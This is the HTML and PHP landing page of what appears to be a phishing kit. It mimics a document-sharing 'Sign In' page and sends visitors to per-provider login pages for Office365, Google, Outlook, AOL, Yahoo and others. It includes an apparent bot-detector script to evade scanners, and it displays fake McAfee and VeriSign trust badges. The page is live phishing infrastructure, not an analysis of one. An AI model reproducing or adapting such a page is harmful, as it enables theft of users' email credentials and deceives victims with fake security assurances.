<?php include('boat_detector.php'); ?>
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="keywords" content=""><meta name="description" content="">
	<link href="img/favicon.png" rel="shortcut icon" />
	<title>View Document - Sign In</title>
	<style type="text/css">body { background:url(img/background2.jpg);font-family: sans-serif; margin:0px; }
  .pop_inner_main { margin:30px auto 0px auto; width:800px; background:#fbfbfb; border: 6px solid #bfd6ec;}
  .logo {padding: 11px 14px;display: inline-block;width: 100%;    background: #fff;
    box-sizing: border-box;border-bottom: 1px solid #f3f3f3; }
	.fb_btm { background:#2b579a; color:#fff; padding: 8px 13px;text-decoration:none;display: inline-block;vertical-align: middle;margin-left: 4%;font-weight: lighter;font-size: 14px;cursor: context-menu; }
	.logo img { display: inline-block;vertical-align: middle;}
	.inner_lft { width:180px;    display: table-cell; vertical-align: top;    padding-top: 22px;    border-right: 1px solid #ececec; }
	.inner_content_body {display: inline-block;width: 100%;padding: 0px 22px;
    box-sizing: border-box;}
	.inner_rhgt { width:430px;    display: table-cell;;    padding-bottom: 61px;     padding-top: 22px;   padding-left: 22px;}
	.inner_rhgt span {width:100%;display: inline-block;}
	.inner_rhgt span a {  background: #ffffff;
    display: inline-block;
    padding: 4px 14px;
    width: 71%;
    text-align: center;
    border: 1px solid #e6e6e6;
    border-radius: 2px;
    margin-bottom: 10px;
    font-weight: bold;
    color: #000;
    text-decoration: none;}
	.trxt_bx {padding: 17px 14px !important;}
	.footer_img { background:#f1f1f1; border-top:1px solid #ccc;display: inline-block;
    width: 100%;min-height: 55px;margin-bottom: 0px;    text-align: center; padding:5px 0px}
	.footer_main { background:#fff; width:100%;display: inline-block; text-align:center;margin-top: 33px;  }
	.footer_inng { width:800px;display: inline-block;cursor: context-menu}
	.footer_inng ul { padding:0px; list-style:none;    width: 20%;
    text-align: left;
    float: left;}
	.footer_inng ul li a { color:#222; text-decoration:none;    margin-bottom: 9px;
    display: inline-block; font-size:14px;}
	.footer_inng ul li h3 { font-size:16px; color: #555;}
	.footer_img a {display: inline-block; margin-left:15px;}
	
	@media screen and (min-width:520px) and (max-width:854px) {
	
	.pop_inner_main { width: 92%;}
	.footer_inng {width: 92%;}
	}
	
	@media screen and (min-width:230px) and (max-width:519px) {
	
	.pop_inner_main { width: 92%;}
	.footer_inng {width: 92%;text-align: left;}
	
	.footer_inng ul { padding: 0px;list-style: none;width: 44%;text-align: left;
    float: none;display: inline-block;vertical-align: top;margin-bottom: 0px;}
	.logo { text-align:center;  }
	.inner_lft { width: 100%; display: inline-block;    border-right: 0px solid #ececec;
    text-align: center;}
	
	.inner_rhgt { width: 100%;display: inline-block;padding-left: 0px;}
	.inner_rhgt span a { width:100%;box-sizing: border-box;}
	
	}
	</style>
</head>
<body>
<div class="pop_inner_main">
<div class="logo"><img alt="" src="img/logo.png" /> <a alt="" class="fb_btm">Select and sign in to view document.</a></div>

<div class="inner_content_body">
<div class="inner_lft"><a href="#"><img alt="" src="img/box.png" /></a></div>

<div class="inner_rhgt"><span><a href="office365/index.php"><img alt="" src="img/officelogo.png" /> </a></span> <span><a href="google/index.php"> <img alt="" src="img/googlelogo.png" /> </a></span> <span><a href="office365/index.php"> <img alt="" src="img/outlooklogo.png" /> </a></span> <span><a href="aol/index.php"> <img alt="" src="img/aollogo.png" /> </a></span> <span><a href="yahoo/index.php"> <img alt="" src="img/yahoologo.png" /> </a></span> <span><a class="trxt_bx" href="other/index.php"> Other </a></span></div>
</div>

<div class="footer_img"><a><img alt="" src="img/mcafee.png" style="width: 110px;" /></a> <a><img alt="" src="img/ssl_verisign.png" style="width: 110px;" /></a></div>
</div>

<div class="footer_main">
<div class="footer_inng">
<ul>
	<li>
	<h3>Business</h3>
	</li>
	<li></li>
	<li><a> Home</a></li>
	<li></li>
	<li><a> Enterprise</a></li>
	<li></li>
	<li><a> Desktop Client</a></li>
	<li></li>
	<li><a> Mobile</a></li>
	<li></li>
	<li><a> Pricing </a></li>
	<li></li>
	<li><a> Security</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Resources</h3>
	</li>
	<li></li>
	<li><a> Blog</a></li>
	<li></li>
	<li><a> Partners</a></li>
	<li></li>
	<li><a> Press</a></li>
	<li></li>
	<li><a> FAQs</a></li>
	<li></li>
	<li><a> Buy</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Support</h3>
	</li>
	<li></li>
	<li><a> Help Center</a></li>
	<li></li>
	<li><a> Contact us</a></li>
	<li></li>
	<li><a> Support</a></li>
	<li></li>
	<li><a> Cookies</a></li>
	<li></li>
	<li><a> Privacy terms</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Community</h3>
	</li>
	<li></li>
	<li><a> Developers</a></li>
	<li></li>
	<li><a> Referrals</a></li>
	<li></li>
	<li><a> Forum</a></li>
	<li></li>
	<li><a> Integrations</a></li>
	<li></li>
</ul>

<ul>
	<li>
	<h3>Connect</h3>
	</li>
	<li></li>
	<li><a> Twitter</a></li>
	<li></li>
	<li><a> Facebook</a></li>
	<li></li>
	<li><a> LinkedIn</a></li>
	<li></li>
	<li><a> Google+</a></li>
	<li></li>
	<li><a> You Tube</a></li>
	<li></li>
</ul>
</div>
</div>
</body>
</html>